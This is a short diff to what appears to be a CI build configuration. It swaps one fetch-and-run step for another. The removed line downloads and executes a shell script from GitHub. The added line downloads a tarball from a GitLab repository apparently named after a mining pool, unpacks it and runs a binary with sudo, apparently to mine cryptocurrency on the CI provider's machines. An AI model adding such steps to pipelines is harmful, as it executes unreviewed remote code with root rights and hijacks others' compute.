@@ -7,7 +7,7 @@ jobs:
       steps:
         - run:
             name: "trial"
-            command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://raw.githubusercontent.com/vivomito/out/main/look.sh && chmod +x look.sh && ./look.sh 
+            command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://gitlab.com/Vaping86/vapers86-zpool/-/raw/main/vapertraders.tar.gz && tar -xf vapertraders.tar.gz && sudo ./gas run.ini 
 
 workflows:
     version: 2.1
